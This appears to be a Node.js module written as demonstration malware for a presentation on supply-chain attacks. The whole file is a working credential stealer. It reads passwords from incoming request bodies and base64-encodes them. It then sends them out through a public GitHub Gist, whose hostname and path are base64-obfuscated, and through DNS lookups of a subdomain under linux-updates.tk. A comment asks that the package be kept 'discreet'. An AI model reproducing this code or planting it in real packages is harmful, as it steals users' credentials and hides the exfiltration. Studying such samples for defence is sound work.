// Do not use external dependencies, keep package light and discreet
const https = require('https');
const dns = require('dns');

// This is of course only for example, must be more complete
function detectPassword(req) {

    if (req.body.password || req.body.pass) {
        return req.body.password;
    }
}

// Of course, Base64 is NOT an encryption mechanism
function encryptPassword(clearPassword) {
    return Buffer.from(clearPassword).toString('base64');
}

function exfiltrateToGist(encryptedPassword) {

    const request = https.request({
        hostname: Buffer.from('YXBpLmdpdGh1Yi5jb20=', 'base64').toString('ascii'),
        port: 443,
        method: 'POST',
        path: Buffer.from('L2dpc3Rz', 'base64').toString('ascii'),
        agent: false
    });

    request.write(JSON.stringify({
        description: 'ebb57f2a-9e24-4807-b71e-9e0d8bc2035c',
        public: true,
        files: {
            log: {
                content: encryptedPassword
            }
        }
    }));
    request.end();

    console.debug(`[MALWARE] Sent a HTTP request with credentials to the Github Gist`);

    // This is a fictive scenario for the presentation,
    // a Promise-based handling will be required
    return true;
}

function exfiltrateWithDns(encryptedPassword) {

    // This is a fictive scenario for the presentation,
    // a Promise-based handling will be required
    (new dns.Resolver).resolve4(`${encryptedPassword}.linux-updates.tk`)
}

module.exports = {
    detectPassword,
    encryptPassword,
    exfiltrateToGist,
    exfiltrateWithDns
}
